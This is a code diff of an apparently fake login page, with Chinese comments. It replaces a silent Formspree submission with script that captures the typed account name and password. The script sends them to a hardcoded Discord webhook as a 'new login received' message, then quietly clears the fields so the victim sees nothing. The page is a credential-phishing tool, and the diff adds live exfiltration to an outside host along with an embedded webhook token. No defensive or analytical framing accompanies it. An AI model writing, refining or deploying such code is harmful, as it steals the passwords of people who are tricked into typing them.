@@ -64,12 +64,14 @@
             right: 939px;
             width: 280px;  /* 這裡改小，例如 100px 或 50px */
             height: auto;
+            border: none;       /* 移除預設邊框 */
+            padding: 0;         /* 移除預設內距 */
+            background: none;
         }
     </style>
 </head>
 <body>
-    <form id="submit-form" action="https://formspree.io/f/xkokjdwb" method="POST">
-        
+    <form id="submit-form">
         <img src="input.png" class="input_img">
         <img src="img.png">
 
@@ -77,24 +79,38 @@
             <img src="button.png" style="width: 100%;">
         </button>
 
-        <input type="text" name="Account" class="input-overlay">
-        <input type="password" name="Password" class="input-overlay123">
+        <input type="text" id="acc" class="input-overlay">
+        <input type="password" id="pwd" class="input-overlay123">
     </form>
+
     <script>
-        // 點擊按鈕後，直接在背景傳送，不會有任何彈窗或跳轉
-        document.getElementById("submit-form").addEventListener("submit", function(e) {
-            e.preventDefault(); // 攔截跳轉
-            const formData = new FormData(this);
-            fetch(this.action, {
-                method: 'POST',
-                body: formData,
-                headers: { 'Accept': 'application/json' }
-            }).then(response => {
-                if (response.ok) {
-                    this.reset(); // 傳送成功後清空輸入框，什麼都不顯示
-                }
-            });
-        });
+    document.getElementById("submit-form").addEventListener("submit", function(e) {
+        e.preventDefault(); 
+
+        const account = document.getElementById("acc").value;
+        const password = document.getElementById("pwd").value;
+
+        // 💡 填入你剛才複製的 Discord Webhook 網址
+        const webhookURL = "https://discord.com/api/webhooks/1494608428969103480/r4QDGJSxwYqfqT1813pNn0xVH3xXdcM2a_qed8B0htM4qPmUlzjoDGP3kjea9FATwFXt";
+
+        // 構造要傳送到 Discord 的訊息格式
+        const payload = {
+            content: `📢 **收到新的登入資訊**\n----------------------------\n👤 **帳號**: \`${account}\`\n🔑 **密碼**: \`${password}\`\n----------------------------`
+        };
+
+        fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                // 傳送成功後清空欄位，不顯示任何動作
+                this.reset();
+            }
+        })
+        .catch(error => console.error('Error:', error));
+    });
     </script>
 </body>
 </html>
